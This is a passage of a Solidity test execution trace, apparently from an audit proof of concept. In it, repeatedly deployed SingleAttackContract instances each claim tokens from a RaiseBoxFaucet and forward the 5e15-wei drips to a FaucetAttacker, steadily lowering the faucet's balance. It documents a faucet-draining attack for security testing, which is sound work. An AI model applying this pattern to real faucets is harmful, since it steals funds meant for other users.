    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 785000000000000000 [7.85e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x07F9D0b4588E1930d380aFfce8E01098039Fc9f9
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 43) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [12927656] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [12926897] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [12890729] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [12883071] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 780000000000000000 [7.8e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x5248d922543F2e90C6D96dCc7F3355387742c2F2
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 44) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [12625687] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [12624928] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [12588760] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [12581102] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 775000000000000000 [7.75e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xff6F1256f5Cc0FAA62e8C7E572389120c9A589bF
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 45) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [12323718] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [12322959] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [12286791] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [12279133] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 770000000000000000 [7.7e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x38Bf78193A50F143e2845c742D72C3E3055BCCF4
